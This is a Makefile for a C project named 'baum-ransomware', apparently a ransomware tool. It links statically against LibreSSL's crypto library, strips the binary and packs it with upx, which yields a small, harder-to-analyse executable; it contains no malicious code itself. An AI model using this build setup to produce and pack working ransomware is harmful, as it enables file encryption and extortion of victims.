CC := gcc
FLAGS := -Wall -pedantic -std=c99 -flto -Os
FLAGS_LD := -static -s -Wl,--gc-sections
BIN := baum-ransomware
SRC := $(wildcard *.c)
OBJ := $(SRC:.c=.o)

SSLPATH := libressl
INCLUDES := $(SSLPATH)/include
LIBDIR := $(SSLPATH)/crypto/.libs
LIB := crypto
LIBPATH := $(LIBDIR)/lib$(LIB).so

LIBEXTRA := -lpthread

README := README.md

.PHONY: all update create_readme clean distclean

all: $(BIN)

update:
	git pull
	git submodule update --init --recursive

create_readme: $(BIN)
	echo "\`\`\`"		> $(README)
	./$(BIN) --help		>> $(README)
	echo "\`\`\`"		>> $(README)

$(BIN): $(OBJ) $(LIBPATH)
	$(CC) $(FLAGS) $(FLAGS_LD) $(OBJ) -L$(LIBDIR) -l$(LIB) $(LIBEXTRA) -o $(BIN)
	upx $(BIN)

.c.o:
	$(CC) $(FLAGS) -I$(INCLUDES) -c $< -o $@

$(LIBPATH):
	cd $(SSLPATH)	; \
	./autogen.sh	; \
	./configure	; \
	make

clean:
	rm -f $(OBJ) $(BIN)

distclean: clean
	make -C $(SSLPATH) distclean
